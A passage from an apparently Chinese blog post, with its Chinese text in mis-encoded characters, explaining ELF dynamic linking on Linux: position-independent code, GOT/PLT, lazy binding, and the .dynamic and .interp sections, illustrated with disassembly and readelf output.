å…³ï¼Œä¸€ç§æ–¹æ³•æ˜¯å€Ÿé‰´æˆ‘ä»¬é™æ€é“¾æ¥æ—¶æ–¹æ³•ï¼Œå°±æ˜¯æŠŠé“¾æ¥æ¬åˆ°äº†è¿è¡Œæ—¶æ¨¡å—åœ°å€ç¡®å®šåï¼Œéå†é‡å®šä½è¡¨å»ç»™ç»å¯¹å¼•ç”¨åšé‡å®šä½ï¼Œå› ä¸ºè¦å»ä¿®æ”¹æŒ‡ä»¤æ‰€ä»¥æ²¡æœ‰åŠæ³•åšåˆ°å¤šè¿›ç¨‹å…±äº«ä»£ç ï¼Œè¿™ä¹Ÿæ˜¯åªåŠ -shareä¸åŠ -fpic æ—¶ä½¿ç”¨çš„é‡å®šä½æ–¹æ³•</p><h3 id="fPIC"><a href="#fPIC" class="headerlink" title="-fPIC"></a>-fPIC</h3><p>-fPICæŒ‡ç¤ºç”Ÿæˆä½ç½®æ— å…³ä»£ç (Postive Independent Code, PIC)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> a;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> b;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">ext</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span>&#123;</span><br><span class="line">    a=<span class="number">1</span>;</span><br><span class="line">    b=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    bar();</span><br><span class="line">    ext();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; gcc -m32 -fPIC -shared -o xxx.so test.c</span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; file xxx.so</span><br><span class="line">xxx.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, BuildID[sha1]=9a4e584b71c83ff881f77f68b5483d63929ca339, not stripped</span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; checksec xxx.so</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/link-load-library-code/chapter7/xxx.so&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h4 id="gt-gt-gt-æ¨¡å—å†…çš„è¿‡ç¨‹è°ƒç”¨å’Œè·³è½¬"><a href="#gt-gt-gt-æ¨¡å—å†…çš„è¿‡ç¨‹è°ƒç”¨å’Œè·³è½¬" class="headerlink" title="&gt;&gt;&gt; æ¨¡å—å†…çš„è¿‡ç¨‹è°ƒç”¨å’Œè·³è½¬"></a><strong>&gt;&gt;&gt; æ¨¡å—å†…çš„è¿‡ç¨‹è°ƒç”¨å’Œè·³è½¬</strong></h4><p>fooé‡Œè°ƒç”¨bar()</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">000003f0 &lt;bar@plt&gt;:</span><br><span class="line">3f0:   ff a3 0c 00 00 00       jmp    *0xc(%ebx)</span><br><span class="line">3f6:   68 00 00 00 00          push   $0x0</span><br><span class="line">3fb:   e9 e0 ff ff ff          jmp    3e0 &lt;_init+0x30&gt;</span><br><span class="line">00000576 &lt;foo&gt;:</span><br><span class="line">588:   e8 63 fe ff ff          call   3f0 &lt;bar@plt&gt;</span><br><span class="line">58d:   e8 6e fe ff ff          call   400 &lt;ext@plt&gt;</span><br><span class="line">592:   90                      nop</span><br></pre></td></tr></table></figure><p>æ¨¡å—å†…æŒ‡ä»¤ä¸æŒ‡ä»¤ä¹‹é—´çš„è·ç¦»ä¸å˜ï¼Œç›´æ¥æŒ‰ä¸å˜çš„ç›¸å¯¹åœ°å€æ¥å¯»å€å°±å¯ä»¥åœ°å€æ— å…³ï¼Œ 0x58d-0x19d(fffffe63)&#x3D;0x3f0ï¼Œè¿™é‡Œç›´æ¥ç”¨äº†pltè¡¨ï¼Œå…ˆæŠŠä»–ç†è§£ä¸ºå°±æ˜¯é‚£ä¸ªå‡½æ•°åœ°å€å§ï¼Œpltè¡¨åé¢å†è¯´</p><blockquote><p>æ¨¡å—å†…åŸæœ¬å¯ä»¥ä¸é‡‡ç”¨pltè¡¨å’Œgotè¡¨ï¼Œç›´æ¥åˆ©ç”¨åç§»å°±å¯ä»¥åšåˆ°åœ°å€æ— å…³ï¼Œé‡‡ç”¨pltå’Œgotè¡¨æ˜¯ä¸ºäº†é˜²æ­¢å¤šä¸ªæ¨¡å—ä¸­å…¨å±€ç¬¦å·(æ¨¡å—å†…çš„å‡½æ•°ï¼Œå…¨å±€å˜é‡ç­‰)å‡ºç°é‡å¤å®šä¹‰çš„æƒ…å†µ</p><p>åœ¨åŠ¨æ€é“¾æ¥è¿‡ç¨‹ä¸­æ˜¯æŒ‰æœ€å…ˆåœ¨æŸä¸ªæ¨¡å—é‡Œå‘ç°çš„ç¬¦å·æ¥çš„ï¼Œä¸‡ä¸€æ˜¯åŸæœ¬å¯¹æœ¬æ¨¡å—é‡Œçš„ç¬¦å·å¼•ç”¨è¢«å…¶ä»–æ¨¡å—é‡Œçš„ç¬¦å·ç»‘å®šåˆ°äº†ï¼Œé‚£å°±æ˜¯æ¨¡å—é—´çš„å…³ç³»ï¼Œåªèƒ½åˆ©ç”¨gotè¡¨æ¥åšPIC</p></blockquote><h4 id="gt-gt-gt-æ¨¡å—å†…æ•°æ®è®¿é—®"><a href="#gt-gt-gt-æ¨¡å—å†…æ•°æ®è®¿é—®" class="headerlink" title="&gt;&gt;&gt;æ¨¡å—å†…æ•°æ®è®¿é—®"></a><strong>&gt;&gt;&gt;æ¨¡å—å†…æ•°æ®è®¿é—®</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="number">550</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">551</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">553</span>:   e8 <span class="number">41</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">599</span> &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line"> <span class="number">558</span>:   <span class="number">05</span> a8 <span class="number">1</span>a <span class="number">00</span> <span class="number">00</span>          add    $<span class="number">0x1aa8</span>,%eax</span><br><span class="line">   a=<span class="number">1</span>;</span><br><span class="line"> <span class="number">55</span>d:   c7 <span class="number">80</span> <span class="number">1</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span>    movl   $<span class="number">0x1</span>,<span class="number">0x1c</span>(%eax)</span><br><span class="line"> <span class="number">564</span>:   <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>æŒ‡ä»¤æ®µå’Œæ•°æ®æ®µä¹‹é—´çš„è·ç¦»æ˜¯å›ºå®šçš„ï¼ŒçŸ¥é“æŒ‡ä»¤åœ°å€å°±å¯ä»¥æ‰¾åˆ°æ¨¡å—å†…æ•°æ®</p><p>æŒ‡ä»¤åœ°å€ä½¿ç”¨è¿™ä¸ª<code> 553:   e8 41 00 00 00      call   599 &lt;__x86.get_pc_thunk.ax&gt;</code>æ¥è·å–çš„ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªä¸€ä¸ªæ¨¡å—å†…è°ƒç”¨çš„ä¾‹å­ï¼Œ0x558+0x41&#x3D;0x599</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000599</span> &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line"> <span class="number">599</span>:   <span class="number">8b</span> <span class="number">04</span> <span class="number">24</span>                mov    (%esp),%eax</span><br><span class="line"> <span class="number">59</span>c:   c3                      ret</span><br></pre></td></tr></table></figure><p>callä¼šæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å‹æ ˆï¼Œå°±æ˜¯0x558ï¼Œç„¶åæŠŠ0x558èµ‹å€¼ç»™eaxï¼ŒæŒ‡ä»¤åœ°å€å°±ä¿å­˜åˆ°äº†eax</p><p><code>add    $0x1aa8,%eax</code>ï¼Œç„¶åeax&#x3D;0x1aa8+0x558&#x3D;0x2000</p><p><code> 55d:   c7 80 1c 00 00 00 01    movl   $0x1,0x1c(%eax)</code></p><p>0x2000å†åŠ ä¸Š0x1c 0x201cæ˜¯ä»€ä¹ˆå‘¢?</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readelf -S  xxx.so</span><br><span class="line">There are <span class="number">33</span> section headers, starting at offset <span class="number">0x1964</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[<span class="number">23</span>] .bss              NOBITS          <span class="number">00002018</span> <span class="number">001018</span> <span class="number">000008</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -s  xxx.so</span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">67</span> entries:</span><br><span class="line">Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line"><span class="number">40</span>: <span class="number">0000201</span>c     <span class="number">4</span> OBJECT  LOCAL  DEFAULT   <span class="number">23</span> a</span><br></pre></td></tr></table></figure><p>æ­£å¥½æ˜¯åœ¨æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡çš„.bssæ®µçš„aï¼Œä¹Ÿç¬¦åˆæˆ‘ä»¬åœ¨é™æ€é“¾æ¥æ—¶çš„åˆ†æ</p><h4 id="gt-gt-gt-æ¨¡å—é—´æ•°æ®è®¿é—®"><a href="#gt-gt-gt-æ¨¡å—é—´æ•°æ®è®¿é—®" class="headerlink" title="&gt;&gt;&gt;æ¨¡å—é—´æ•°æ®è®¿é—®"></a><strong>&gt;&gt;&gt;æ¨¡å—é—´æ•°æ®è®¿é—®</strong></h4><p><strong>æ•²é»‘æ¿äº†</strong>ï¼Œæ¨¡å—é—´æ‰æ˜¯é‡ç‚¹ï¼Œè¿™ä¸ªæ—¶å€™ç›¸å¯¹åœ°å€å·²ç»ä¸å­˜åœ¨äº†ï¼Œè€Œæ˜¯åœ¨æ•°æ®æ®µçš„å¼€å§‹å¤„è®¾ç«‹äº†ä¸€ä¸ªå«åšå…¨å±€åç§»é‡è¡¨(Global Offset Table, GOT)çš„æŒ‡é’ˆæ•°ç»„(pwnæ‰‹æœ€çˆ±å“ˆå“ˆ)</p><p>æ±‡ç¼–å™¨ä¸ºGOTä¸­çš„æ¯ä¸€ä¸ªé¡¹ç”Ÿæˆä¸€ä¸ªé‡å®šä½é¡¹ï¼Œç±»ä¼¼äºæˆ‘ä»¬é™æ€é“¾æ¥çš„æ•°æ®æ®µçš„é‡å®šä½è¡¨.rel.data,åŠ¨æ€é“¾æ¥é‡Œå«åš.rel.dynç”¨æ¥ä¿®æ­£æ•°æ®å¼•ç”¨ï¼Œä¸¤ç§è¡¨æ•°æ®ç»“æ„ä¸€æ ·</p><p>åŠ¨æ€é“¾æ¥å™¨åœ¨æŠŠå¼•ç”¨æ•°æ®æ‰€åœ¨æ¨¡å—çš„åŠ è½½åœ°å€ç¡®å®šåï¼ŒæŠŠæ­£ç¡®åœ°å€å†™å…¥ä»–çš„gotï¼Œå°±å®Œæˆäº†é‡å®šä½ï¼ŒåŒæ—¶ç”±äºè¿™ä¸ªæ•°æ®æ®µæ˜¯è¿›ç¨‹ç§æœ‰çš„ï¼Œä¹Ÿå°±å®ç°äº†å†…å­˜é‡Œçš„ä»£ç æ®µå¯ä»¥å¤šä¸ªè¿›ç¨‹å…±äº«</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -S  xxx.so</span><br><span class="line">There are 33 section headers, starting at offset 0x1964:</span><br><span class="line">Section Headers:</span><br><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[20] .got              PROGBITS        00001fe8 000fe8 000018 04  WA  0   0  4</span><br><span class="line"></span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -r  xxx.so</span><br><span class="line">Relocation section &#x27;.rel.dyn&#x27; at offset 0x358 contains 9 entries:</span><br><span class="line">Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00001fec  00000206 R_386_GLOB_DAT    00000000   b</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void bar()&#123;</span><br><span class="line"> 550:   55                      push   %ebp</span><br><span class="line"> 551:   89 e5                   mov    %esp,%ebp</span><br><span class="line"> 553:   e8 41 00 00 00          call   599 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line"> 558:   05 a8 1a 00 00          add    $0x1aa8,%eax</span><br><span class="line">    a=1;</span><br><span class="line"> 55d:   c7 80 1c 00 00 00 01    movl   $0x1,0x1c(%eax)</span><br><span class="line"> 564:   00 00 00</span><br><span class="line">    b=2;</span><br><span class="line"> 567:   8b 80 ec ff ff ff       mov    -0x14(%eax),%eax</span><br><span class="line"> 56d:   c7 00 02 00 00 00       movl   $0x2,(%eax)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·æ˜¯åˆ©ç”¨å›ºå®šåç§»æ‰¾åˆ°gotè¡¨ï¼Œeaxåœ¨å‰é¢å·²ç»ç®—è¿‡æ˜¯0x2000ï¼Œå†-0x14æ­£å¥½æ˜¯0x1FEC æ­£å¥½å¯¹åº”bçš„gotè¡¨çš„ä½ç½®ï¼Œå¾€å®ƒé‡Œé¢çš„æŒ‡é’ˆå†™å…¥å€¼å°±è¡Œäº†</p><blockquote><p>å…³äºè·å–pcå€¼ï¼Œæˆ‘åœ¨èµ„æ–™ä¸Šè¿˜çœ‹åˆ°ä¸€ç§ç›´æ¥callä¸‹ä¸€æ¡æŒ‡ä»¤çš„æ–¹å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000357:e8 00 00 00 00    call 00035c</span><br><span class="line">00035c:5b                 popl %ebx</span><br></pre></td></tr></table></figure><p>æ¯”call getpcçš„å‡½æ•°å°‘äº†retï¼Œé€Ÿåº¦å’Œç©ºé—´éƒ½æœ‰æå‡</p><p>64ä½ç¨‹åºéƒ½æ˜¯é‡‡ç”¨ripç›´æ¥åŠ åç§»,32ä½ç¨‹åºä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨eipå¯„å­˜å™¨é‡Œçš„å€¼åŠ åç§»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000001139 &lt;bar&gt;:</span><br><span class="line">    1139:       f3 0f 1e fa             endbr64</span><br><span class="line">    113d:       55                      push   %rbp</span><br><span class="line">    113e:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">    1141:       c7 05 e9 2e 00 00 01    movl   $0x1,0x2ee9(%rip)        # 4034 &lt;a&gt;</span><br><span class="line">    1148:       00 00 00</span><br><span class="line">    114b:       48 8b 05 86 2e 00 00    mov    0x2e86(%rip),%rax        # 3fd8 &lt;b&gt;</span><br><span class="line">    1152:       c7 00 02 00 00 00       movl   $0x2,(%rax)</span><br><span class="line">    1158:       90                      nop</span><br><span class="line">    1159:       5d                      pop    %rbp</span><br><span class="line">    115a:       c3                      ret</span><br></pre></td></tr></table></figure></blockquote><h4 id="gt-gt-gt-æ¨¡å—é—´è¿‡ç¨‹è°ƒç”¨å’Œè·³è½¬"><a href="#gt-gt-gt-æ¨¡å—é—´è¿‡ç¨‹è°ƒç”¨å’Œè·³è½¬" class="headerlink" title="&gt;&gt;&gt;æ¨¡å—é—´è¿‡ç¨‹è°ƒç”¨å’Œè·³è½¬"></a><strong>&gt;&gt;&gt;æ¨¡å—é—´è¿‡ç¨‹è°ƒç”¨å’Œè·³è½¬</strong></h4><p>å¯¹äºæ¨¡å—é—´çš„è°ƒç”¨ç­‰ï¼Œä¹Ÿå¯ä»¥å¾€gotè¡¨é‡Œå†™å…¥å‡½æ•°åœ°å€ï¼Œå°±åƒä¸Šé¢ä¸€æ ·ï¼ŒELFæŠŠgotåˆ†ä¸ºäº†.gotå’Œ.got.pltã€‚ å…¶ä¸­.gotç”¨æ¥ä¿å­˜å…¨å±€å˜é‡å¼•ç”¨çš„åœ°å€ï¼Œ.got.pltç”¨æ¥ä¿å­˜å‡½æ•°å¼•ç”¨çš„åœ°å€</p><p>ç±»ä¼¼äºæˆ‘ä»¬é™æ€é“¾æ¥çš„ä»£ç æ®µçš„é‡å®šä½è¡¨.rel.textï¼ŒåŠ¨æ€é“¾æ¥é‡Œ.rel.pltå¯¹å‡½æ•°å¼•ç”¨çš„ä¿®æ­£ï¼Œä¸¤ç§è¡¨æ•°æ®ç»“æ„ä¸€æ ·</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[21] .got.plt          PROGBITS        00002000 001000 000014 04  WA  0   0  4</span><br><span class="line">Relocation section &#x27;.rel.plt&#x27; at offset 0x3c0 contains 2 entries:</span><br><span class="line">Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00002010  00000507 R_386_JUMP_SLOT   00000000   ext</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨å®ç°çš„è¿‡ç¨‹ä¸­æ¯æ¬¡ç¨‹åºå¯åŠ¨æ—¶åŠ¨æ€é“¾æ¥å™¨éƒ½è¦å¯¹gotè¡¨åšä¿®æ­£ï¼Œä½†æ˜¯è¢«ä¿®æ­£çš„å¤§é‡å‡½æ•°æˆ‘ä»¬ç¨‹åºä½¿ç”¨çš„åªæ˜¯ä¸€å°éƒ¨åˆ†ï¼Œå°±å‡ºç°äº†å»¶è¿Ÿç»‘å®š(lazy binding)çš„æ–¹æ³•ï¼Œåœ¨ç¨‹åºç”¨åˆ°æ—¶åœ¨è¿›è¡ŒåŠ¨æ€é“¾æ¥ä¿®æ­£gotï¼Œæ˜¯å€ŸåŠ©è¿‡ç¨‹é“¾æ¥è¡¨(Procedure Linkage Table, PLTï¼‰[ä»£ç æ®µ]å’Œgot[æ•°æ®æ®µ]é…åˆæ¥å®ç°çš„</p><p>got.pltå‰ä¸‰é¡¹æ˜¯ç‰¹æ®Šå€¼</p><ul><li>ç¬¬ä¸€é¡¹æ˜¯.dynamicæ®µçš„è£…è½½åœ°å€</li><li>ç¬¬äºŒé¡¹æ˜¯åŠ¨æ€é“¾æ¥çš„æ ‡è¯†ä¿¡æ¯ link_mapçš„åœ°å€</li><li>ç¬¬ä¸‰é¡¹æ˜¯åŠ¨æ€é“¾æ¥å™¨çš„åšåŠ¨æ€é“¾æ¥çš„å‡½æ•°å…¥å£ _dl_runtime_resolve</li></ul><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><blockquote><p>.dynamicæ®µä¿å­˜äº†åŠ¨æ€é“¾æ¥å™¨æ‰€éœ€è¦çš„åŸºæœ¬ä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword    d_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;            <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506083401085.png" alt="image-20230506083401085"></p><p>åœ°å€æ˜¯åœ¨æ–‡ä»¶é‡Œçš„åç§»</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -d  xxx.so</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf04 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x3d0</span><br><span class="line"> 0x0000000d (FINI)                       0x5cc</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x1ef8</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x1efc</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x138</span><br><span class="line"> 0x00000005 (STRTAB)                     0x27c</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x17c</span><br><span class="line"> 0x0000000a (STRSZ)                      179 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x2000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   16 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x3c0</span><br><span class="line"> 0x00000011 (REL)                        0x370</span><br><span class="line"> 0x00000012 (RELSZ)                      80 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x350</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x330</span><br><span class="line"> 0x6ffffffa (RELCOUNT)                   3</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure></blockquote><p>æ¯ä¸ªæ¨¡å—å¤–çš„å‡½æ•°éƒ½æœ‰ä¸€ä¸ª.rel.pltè¡¨é¡¹ï¼Œæ¯ä¸ªè¡¨é¡¹å¤§å°éƒ½æ˜¯16å­—èŠ‚ï¼Œå‰ä¸¤é¡¹ç‰¹æ®Š</p><ul><li>ç¬¬ä¸€é¡¹<ul><li>pushq *GOT[1];jmpq *GOT[2]</li><li>å› ä¸ºæ¯ä¸€ä¸ªå‡½æ•°å»¶è¿Ÿç»‘å®šæ—¶éƒ½éœ€è¦æ‰§è¡Œä¸Šé¢è¿™ä¸¤æ¡æŒ‡ä»¤ï¼Œä¸ºäº†å‡å°‘é‡å¤ä»£ç å°±æŠŠä»–ä»¬æ”¾åˆ°äº†å›ºå®šä½ç½®ï¼Œä¾›è°ƒç”¨</li></ul></li><li>ç¬¬äºŒé¡¹æ˜¯ç³»ç»Ÿå¯åŠ¨å‡½æ•°__libc_start_mainæ¥åˆå§‹åŒ–ç¯å¢ƒ</li></ul><p>å‰©ä¸‹çš„éƒ½æ˜¯jmp *got[id]; push id;jump plt[0];çš„16å­—èŠ‚æŒ‡ä»¤</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506013722990.png" alt="image-20230506013722990"></p><ol><li>ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°æ˜¯è¿›å…¥å‡½æ•°æ‰€åœ¨pltè¡¨æ¡ç›®</li><li>ç¬¬ä¸€æ¡pltæŒ‡ä»¤è·³åˆ°å¯¹åº”gotè¡¨å­˜å‚¨åœ°å€ï¼Œç”±äºåˆšå¼€å§‹æ¯ä¸ªGOTæ¡ç›®éƒ½æŒ‡å‘å¯¹åº”PLTæ¡ç›®çš„ç¬¬äºŒæ¡æŒ‡ä»¤ï¼Œæ•…å›åˆ°pltæ¡ç›®ä¸­</li><li>å°†å‡½æ•°idå‹å…¥æ ˆï¼Œè·³åˆ°plt[0]æ¡ç›®</li><li>plt[0]æŠŠgot[1]å‹å…¥æ ˆé€šè¿‡gotp[2]è°ƒç”¨åŠ¨æ€é“¾æ¥å™¨ï¼ŒåŠ¨æ€é“¾æ¥å™¨ç¡®å®šå‡½æ•°çœŸå®åœ°å€å¹¶å¡«å…¥gotæ¡ç›®</li><li>å†æ¬¡å›åˆ°è¯¥å‡½æ•°è°ƒç”¨è¿™æ¬¡åŠä»¥åå¯ä»¥ç›´æ¥é€šè¿‡pltè¡¨æ‰¾åˆ°å‡½æ•°çœŸå®åœ°å€</li></ol><p>çœ‹ä¸ªå®é™…ä¾‹å­ï¼Œå®³ï¼Œè¿˜æ˜¯ç»å…¸çš„hello worldï¼Œçœ‹printfæ˜¯å¦‚ä½•lazy bindingçš„</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506014213830.png" alt="image-20230506014213830"></p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506014305987.png" alt="image-20230506014305987"></p><p>jmpåˆ°printf gotè¡¨é¡¹é‡Œçš„å€¼</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506014448462.png" alt="image-20230506014448462"></p><p>æ²¡æœ‰åšé‡å®šä½æ—¶é»˜è®¤å°±æ˜¯ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼ŒæŠŠå‡½æ•°idå‹æ ˆ</p><p>jmpåˆ°0x4003f0æ‰§è¡Œ</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506015302033.png" alt="image-20230506015302033"></p><p>éšåjmpåˆ°0x601010é‡Œå­˜çš„åŠ¨æ€é“¾æ¥çš„å‡½æ•°å…¥å£_dl_runtime_resolve_xsavec</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506015707950.png" alt="image-20230506015707950"></p><p>è·³åˆ°printfçš„åŒæ—¶å¾€goté‡Œå†™å…¥çœŸå®åœ°å€</p><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506015613569.png" alt="image-20230506015613569"></p><p>ä¸‹æ¬¡å°±å¯ä»¥ç›´æ¥è·³è¿‡å»äº†</p><h2 id="åŠ¨æ€é“¾æ¥å™¨"><a href="#åŠ¨æ€é“¾æ¥å™¨" class="headerlink" title="åŠ¨æ€é“¾æ¥å™¨"></a>åŠ¨æ€é“¾æ¥å™¨</h2><h3 id="interp"><a href="#interp" class="headerlink" title=".interp"></a>.interp</h3><p>interpæ®µè§„å®šäº†å¯æ‰§è¡Œç¨‹åºçš„åŠ¨æ€é“¾æ¥å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -p .interp  a.out</span><br><span class="line">String dump of section &#x27;.interp&#x27;:</span><br><span class="line">  [     0]  /lib/ld-linux.so.2</span><br></pre></td></tr></table></figure><p>&#x2F;lib&#x2F;ld-linux.so.2æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œè¿™æ ·æˆ‘ä»¬æ›´æ–°åŠ¨æ€åº“çš„æ—¶å€™åªéœ€è¦æŠŠç¬¦å·é“¾æ¥é“¾æ¥åˆ°æ–°åº“ä¸Šï¼Œè€Œä¸ç”¨æ›´æ”¹ç¨‹åºæœ¬ä½“</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; ll  /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root root <span class="number">25</span> Apr <span class="number">22</span>  <span class="number">2021</span> /lib/ld-linux.so<span class="number">.2</span> -&gt; i386-linux-gnu/ld<span class="number">-2.23</span>.so*</span><br></pre></td></tr></table></figure><p>åŠ¨æ€é“¾æ¥å™¨ä¹Ÿæ˜¯ä¸€ä¸ªç‰¹æ®Šå…±äº«æ–‡ä»¶ï¼Œè€Œä¸”ä»–æ˜¯å¯æ‰§è¡Œçš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; file /lib/i386-linux-gnu/ld<span class="number">-2.23</span>.so*</span><br><span class="line">/lib/i386-linux-gnu/ld<span class="number">-2.23</span>.so: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, BuildID[sha1]=<span class="number">2b</span>ea6d29e841fecacc546b9b5ab802bd061e8b29, stripped</span><br></pre></td></tr></table></figure><p>ä»–æ˜¯åŠ¨æ€é“¾æ¥çš„,ä½†æ˜¯ä»–ä¸èƒ½ä¾èµ–å¦‚ä½•åº“(æ‰€ä»¥åœ¨lddè¿›è¡Œåˆ†æçš„æ—¶å€™ï¼Œä¼šæŠŠä»–åˆ†æä¸ºé™æ€é“¾æ¥)ï¼Œåœ¨é‡å®šä½ä¹‹å‰ä¸èƒ½è°ƒç”¨ä»»ä½•æ”¾åœ¨goté‡Œçš„ä»»ä½•ä¸œè¥¿ï¼ŒæŒºå¤¸å¼ çš„ï¼Œæ¯•ç«Ÿè‡ªå·±å®šä¹‰çš„å‡½æ•°ä¹Ÿä¼šè¢«æ”¾åˆ°goté‡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; ldd /lib/i386-linux-gnu/ld<span class="number">-2.23</span>.so*</span><br><span class="line">        statically 